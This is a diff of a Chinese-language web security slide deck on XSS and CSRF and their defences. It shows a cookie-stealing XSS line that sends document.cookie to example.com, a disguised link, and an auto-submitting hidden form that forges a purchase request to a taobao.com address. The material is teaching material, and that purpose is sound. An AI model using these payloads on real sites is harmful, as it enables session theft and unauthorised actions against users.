@@ -46,6 +46,15 @@
   text-align:left;
 }
 
+.reveal .noAnimation span,
+.reveal .noAnimation:hover span {
+  transform:none;
+  -webkit-transform:none;
+  color:blue;
+  text-decoration:underline;
+  
+}
+
 </style>
 
     <!--[if lt IE 9]>
@@ -106,7 +115,7 @@
             <ul>
               <li>恶意代码作用域为被攻击页面</li>
               <li>获取用户 cookie, 然后收集起来</li>
-              <li><pre style="resize:both"><code class="javascript" contenteditable>(new Image()).src="http://example.com?secret=" + encodeURIComponent(document.cookie);</code></pre></li>
+              <li><pre style="resize:both"><code class="html" contenteditable>(new Image()).src="http://example.com?secret=" + encodeURIComponent(document.cookie);</code></pre></li>
             </ul>
           </section>
 
@@ -130,20 +139,94 @@
             <ul>
               <li>Cross-site request forgery - 跨站请求伪造</li>
               <li>原理: 
-              <p class="fragment">通过伪装来自受信任用户的请求来利用受信任的网站</p>
+              <p class="fragment">伪装来自受信任用户的请求来利用受信任的网站</p>
               </li>
             </ul>
           </section>
 
           <section>
             <h2>CSRF</h2>
+            <h4>攻击方式:</h4>
+            <ul>
+              <li class="fragment">引导用户点击恶意链接</li>
+              <li class="fragment">恶意链接里向受信任网站发出请求(get, post)</li>
+              <li class="fragment">
+                <a class="noAnimation" href="http://localhost/csrf.php" target="_blank">http://tejia.taobao.com/</a>
+<pre class="fragment"><code class="html" contenteditable>&lt;a href="http://localhost/csrf.php" target="_blank"&gt;http://tejia.taobao.com/&lt;/a&gt;</code></pre>
+              </li>
+              <li class="fragment"><pre style="resize:both"><code class="html" contenteditable>&lt;!--http://localhost/csrf.php--&gt;
+&lt;form action="http://buy.taobao.com" method="post" id="csrf"&gt;
+  &lt;input type="hidden" name="itemid" value="123456" /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById('csrf').submit();
+&lt;/script&gt;
+</code></pre></li>
+            </ul>
+          </section>
+
+
+
+          <section>
+            <h2>CSRF</h2>
+            <h4>说个例子: </h4>
+            <ul>
+              <li>人人网 csrf</li>
+              <li>攻击过程: sinaapp 上放了个恶意网页; 访问该网页自动向人人网发个状态,
+              同时带上页面地址, 好友访问后执行相同过程, 因此迅速传播开来.</li>
+              <li class="fragment">解决办法: <p><img src="images/renren-token.jpg" /></p></li>
+            </ul>
+          </section>
+
+          <section>
+            <h2>CSRF</h2>
+            <h4>防范:</h4>
+            <ul>
+              <li>加 token: 令牌, 特权, 表明请求是被授权的</li>
+              <li>给需要防止 csrf 攻击的 http 请求加 token 验证; token 只能在信任的网站获取, 其他网站获取不到.</li>
+              <li>后端保存着一份用户的 token, 对没有 token 的请求不做处理.</li>
+              <li class="fragment"><pre style="resize:both"><code class="html" contenteditable>&lt;form action="http://buy.taobao.com" method="post" id="csrf"&gt;
+  &lt;input type="hidden" name="itemid" value="123456" /&gt;
+  &lt;input type="hidden" name="token" value="23fasd4d5" /&gt;
+&lt;/form&gt;
+</code></pre></li>
+              <li class="fragment">一般写操作的请求都需要加 token</li>
+            </ul>
+          </section>
+
+          <section>
+            <h2>CSRF</h2>
+            <h4>webX 的 token</h4>
+            <p><img src="images/webx-token.jpg" /></p>
+            <p class="fragment"><img src="images/browser_token.jpg" /></p>
+          </section>
+
+          <section>
+            <h2>CSRF</h2>
             <h4>与 XSS 的不同: </h4>
             <ul>
+              <li class="fragment">XSS 是向目标网站注入恶意脚本; 目标网站没有过滤用户内容导致</li>
+              <li class="fragment">CSRF 是恶意网站向其他网站发送恶意请求(get, post 等); 目标网站没有充分验证是否是合法请求</li>
             </ul>
           </section>
 
         </section>
 
+
+
+        <section>
+            <h2>UTF-7 漏洞</h2>
+        </section>
+
+
+
+        <section>
+            <h2>Thank You!</h2>
+
+            <ul>
+              <li><a href="http://wiki.ued.taobao.net/doku.php?id=ued.bj:f2e:safe&s[]=utf&s[]=7&s[]=%E6%BC%8F%E6%B4%9E" target="_blank">更多</a></li>
+            </ul>
+        </section>
       </div>
 
     </div>
